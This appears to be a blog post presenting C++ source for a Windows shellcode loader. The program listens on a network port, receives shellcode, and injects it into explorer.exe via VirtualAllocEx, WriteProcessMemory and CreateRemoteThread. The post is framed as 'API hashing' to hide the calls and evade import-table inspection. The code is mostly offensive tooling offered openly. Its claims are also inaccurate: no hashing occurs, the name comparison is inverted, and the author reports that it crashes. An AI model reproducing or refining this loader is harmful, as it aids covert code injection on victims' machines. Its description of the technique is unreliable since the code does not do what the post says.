# Windows API hashing - Part 3.4

Finally got the API hashing to work. This would successfully bypass the IAT and prevent leakage of kernel32 methods.

Code:
```c++
#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>

#pragma comment(lib, "Ws2_32.lib")

PDWORD getAddress_edata(LPCSTR Dllname,const char* fncName) {
    HMODULE base_addr = GetModuleHandleA(Dllname);
    if (base_addr == NULL) {
        return (PDWORD)(base_addr);
    }
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base_addr;
    PIMAGE_NT_HEADERS pe_header = (PIMAGE_NT_HEADERS)((LPBYTE)base_addr + dos_header->e_lfanew);
    IMAGE_OPTIONAL_HEADER imgage_headers_kernel = (IMAGE_OPTIONAL_HEADER)(pe_header->OptionalHeader);
    IMAGE_DATA_DIRECTORY export_table = imgage_headers_kernel.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    PIMAGE_EXPORT_DIRECTORY export_dir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)base_addr + export_table.VirtualAddress);        //export_table.VirtualAddress is a RVA so add base_addr to get Virtual Address

    PDWORD functions = (PDWORD)((LPBYTE)base_addr + export_dir->AddressOfFunctions);
    PDWORD name = (PDWORD)((LPBYTE)base_addr + export_dir->AddressOfNames);

    for (int i = 0; i < (int)export_dir->NumberOfNames; i++) {
        if (strcmp(fncName, (char*)((LPBYTE)base_addr + name[i]))) {
            return (PDWORD)((LPBYTE)(base_addr)+functions[i]);
        }
    }
    return (PDWORD)(NULL);
}

DWORD getProcessByName(const std::wstring& name) {
    DWORD pid = 0;
    PROCESSENTRY32 entry;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return -1;
    }
    entry.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(snapshot, &entry) == TRUE) {
        while (Process32Next(snapshot, &entry) == TRUE) {
            if (!name.compare(entry.szExeFile)) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        }
    }
    CloseHandle(snapshot);
    return -1;
}

using create_thread = HANDLE (NTAPI*)(
    HANDLE                 hProcess,
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID                 lpParameter,
    DWORD                  dwCreationFlags,
    LPDWORD                lpThreadId
);

using open_process = HANDLE (NTAPI*)(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwProcessId
);

using virtualloc_ex = LPVOID (NTAPI*)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
);

using wirte_proc_mem = BOOL (NTAPI*)(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T* lpNumberOfBytesWritten
);

int main()
{
    WSADATA wsadata;
    int error = WSAStartup(0x0202, &wsadata);
    if (error) {
        return -1;
    }
    SOCKADDR_IN address;
    address.sin_family = AF_INET;
    address.sin_port = htons(8080);
    address.sin_addr.s_addr = inet_addr("0.0.0.0");

    char opt = 'a';
    int addr_len=sizeof(address);
    int shellcode_bytes = 0;
    SOCKET Listensocket = socket(AF_INET, SOCK_STREAM, 0);
    char buffer[1024];

//    setsockopt(Listensocket, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));

    if (bind(Listensocket, (SOCKADDR *)&address, sizeof(address)) == SOCKET_ERROR) {
        closesocket(Listensocket);
        WSACleanup();
        return -1;
    }
    if (listen(Listensocket, SOMAXCONN) == SOCKET_ERROR) {
        closesocket(Listensocket);
        WSACleanup();
        return -1;
    }
    Listensocket = accept(Listensocket, NULL, NULL);
    if (Listensocket == INVALID_SOCKET) {
        closesocket(Listensocket);
        WSACleanup();
        return -1;
    }
    
    memset(buffer, 0, sizeof(buffer));
    shellcode_bytes = recv(Listensocket, buffer, sizeof(buffer) - 1, 0);

    if (shellcode_bytes == SOCKET_ERROR) {
        closesocket(Listensocket);
        WSACleanup();
        return -1;
    }
    closesocket(Listensocket);

    PDWORD virtual_allocex_address = getAddress_edata("C:\\Windows\\System32\\kernel32.dll", "VirtualAllocEx");
    PDWORD open_process_addr = getAddress_edata("C:\\Windows\\System32\\kernel32.dll", "OpenProcess");
    PDWORD create_remote_thread_addr = getAddress_edata("C:\\Windows\\System32\\kernel32.dll", "CreateRemoteThread");
    PDWORD write_proc_mem_addr = getAddress_edata("C:\\Windows\\System32\\kernel32.dll", "WriteProcessMemory");

    if (virtual_allocex_address == (PDWORD)(NULL) || open_process_addr == (PDWORD)(NULL) || create_remote_thread_addr == (PDWORD)(NULL) || write_proc_mem_addr == (PDWORD)(NULL)) {
        WSACleanup();
        return -1;
    }

    open_process process = (open_process)(open_process_addr);
    virtualloc_ex virtual_allocex = (virtualloc_ex)(virtual_allocex_address);
    create_thread newThread = (create_thread)(create_remote_thread_addr);
    wirte_proc_mem WriteProcMem = (wirte_proc_mem)(write_proc_mem_addr);

    std::string target_process = "explorer.exe";
    std::wstring target(target_process.begin(), target_process.end());
    int pid = (int)getProcessByName(target);

    if (pid == -1) {
        WSACleanup();
        return -1;
    }
    HANDLE proc_handle = process(PROCESS_ALL_ACCESS, false, pid);
    HANDLE addr = virtual_allocex(proc_handle, NULL, 0x1000, 0x300, 0x40);
    WriteProcMem(proc_handle, addr, buffer, shellcode_bytes, NULL);
    newThread(proc_handle, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL,0, NULL);
    WSACleanup();
    return 0;
} 
```

## What does above code do?
- We using API hashing to hide all our functions and completly modify the code from C# to c++.
- Perform process injection on explorer.exe process via listening for shellcode.


## Does this work?
- Sadly, the `process` function errors performs acces violation. Yet to debug this. 
